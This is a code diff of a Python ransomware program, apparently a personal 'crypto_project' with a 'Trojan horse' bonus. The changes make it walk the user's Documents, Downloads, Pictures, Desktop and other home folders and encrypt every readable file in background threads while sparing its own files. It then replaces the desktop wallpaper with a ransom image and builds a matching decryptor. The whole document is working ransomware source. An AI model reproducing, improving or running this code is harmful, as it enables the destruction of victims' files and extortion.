@@ -12,7 +12,6 @@
 # Bonus : Trojan horse
 from __init__ import encrypt_file
 from key import newkeys
-import win32api
 import os
 from datetime import datetime
 import mysql.connector
@@ -39,7 +38,7 @@ def protect_Code_Files(filename):
     if filename in ("__init__.py", "asn1.py", "cli.py", "common.py",
                     "core.py", "key.py", "parallel.py", "pem.py",
                     "pkcs1.py", "pkcs1_v2.py", "prime.py", "randnum.py",
-                    "trasform.py", "util.py"):
+                    "trasform.py", "util.py","Ransomware.py","image.png"):
         return True
     return False
 
@@ -81,54 +80,29 @@ def crypt():
     input(">")
 
     # ############################ 4- go through the files ################################
-    drives = win32api.GetLogicalDriveStrings()
-    drives = drives.split('\000')[:-1]
-
-    for drive in drives:
-        for dirpath, dirnames, filenames in os.walk(drive):
+    userhome = os.path.expanduser("~")
+    folders_in_home_directory = ["Documents", "Downloads", "Music", "Pictures", "Videos", "Desktop", "Templates", "Contacts", "Start Menu"] 
+    
+    for folder in folders_in_home_directory:
+        for dirpath, dirnames, filenames in os.walk(os.path.join(userhome, folder)):
             for filename in filenames:
                 if protect_Code_Files(filename) == False:
                     file = os.path.join(dirpath, filename)
-                    if os.access(file, os.W_OK) and os.access(file, os.R_OK):
-                        try:
-                            Thread(target=encrypt_file, args=(file, pubkey)).start()
-                            print(file, " : crypted successfully ")
-                        except:
-                            print("ignoring error on crypting this file : ", file)
+                    if file.endswith(".ini"):
+                        continue
                     else:
-                        print("access denied to this file : ", file)
+                        if os.access(file, os.W_OK) and os.access(file, os.R_OK):
+                            try:
+                                Thread(target=encrypt_file, args=(file, pubkey)).start()
+                                print(file, " : crypted successfully ")
+                            except:
+                                print("ignoring error on crypting this file : ", file)
+                        else:
+                            print("access denied to this file : ", file)
                     
-
-    # drive = "C:\\Users\\win10\\Desktop\\Test"
-
-    # for dirpath, dirnames, filenames in os.walk(drive):
-    #         for filename in filenames:
-    #             if protect_Code_Files(filename) == False:
-    #                 file = os.path.join(dirpath, filename)
-    #                 try:
-    #                     # ############################ 5- encrypt the files ################################
-    #                     encrypt_file(file, pubkey)
-    #                     print(file)
-    #                 except:
-    #                     print("can't encrypt the file : " + str(file))
-
     input(">")
 
-    # ############################ 6- show encryption screen ################################
-
-
-    import ctypes
-
-    SPI_SETDESKWALLPAPER = 20
-
-    # Replace 'path/to/image.jpg' with the path of the image you want to use
-    image_path = r'C:\Users\belha\Desktop\crypto_project\image.png'
-
-    # Call the Win32 API function to set the desktop background
-    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path , 0)
-
-    input("image set")
-    # ############################ 7- create decryptor program ################################
+    # ############################ 6- create decryptor program ################################
     import subprocess
 
     program_code = '''
@@ -142,24 +116,34 @@ import win32api
 from datetime import datetime
 import mysql.connector
 from __init__ import decrypt_file
-from key import newkeys, PrivateKey
+from key import PrivateKey
 
 def decyptionalgorithme(key):
     key = key.split(",")
-    finalkey = PrivateKey(int(key[0]), int(key[1]), int(key[2]), int(key[3]), int(key[4]))    
+    finalkey = PrivateKey(int(key[0]), int(key[1]), int(key[2]), int(key[3]), int(key[4]))
+
+    userhome = os.path.expanduser("~")
+    folders_in_home_directory = ["Documents", "Downloads", "Music", "Pictures", "Videos", "Desktop", "Templates", "Contacts", "Start Menu"] 
     
-    # drives = win32api.GetLogicalDriveStrings()
-    # drives = drives.split('\000')[:-1]
+    for folder in folders_in_home_directory:
+        for dirpath, dirnames, filenames in os.walk(os.path.join(userhome, folder)):
+            for filename in filenames:
+                if protect_Code_Files(filename) == False:
+                    file = os.path.join(dirpath, filename)
+                    if os.access(file, os.W_OK) and os.access(file, os.R_OK):
+                        try:
+                            Thread(target=decrypt_file, args=(file, finalkey)).start()
+                            print(file, " : decrypted successfully ")
+                        except:
+                            print("ignoring error on crypting this file : ", file)
+                    else:
+                        print("access denied to this file : ", file)    
     
-    #for drive in drives:
-    #    for dirpath, dirnames, filenames in os.walk(drive):
-    #        for filename in filenames:
-    #            if protect_Code_Files(filename) == False:
-    #                file = os.path.join(dirpath, filename)
-    #                try:  # 5- encrypting_files
-    #                    decrypt_file(file, finalkey) 
-    #                except:
-    #                    print("can't decrypt the file : " + str(file))               
+    import ctypes
+    SPI_SETDESKWALLPAPER = 20
+
+    # Set the wallpaper to the default Windows background image
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg", 0)
 
 def decrypt():
     hostname = []
@@ -232,6 +216,22 @@ decrypt()
     #subprocess.run(f"./dist/{program_name.split('.')[0]}")
 
     # trojan horse : allahou a3lem
+
+    # ############################ 7- show encryption screen ################################
+
+    import ctypes
+
+    SPI_SETDESKWALLPAPER = 20
+
+    # Replace 'path/to/image.jpg' with the path of the image you want to use
+    image_path = r'C:\Users\belha\Desktop\crypto_project\image.png'
+
+    # Call the Win32 API function to set the desktop background
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path , 0)
+
+    print("image set")
+
+    root.quit()
 
 
 i = 1
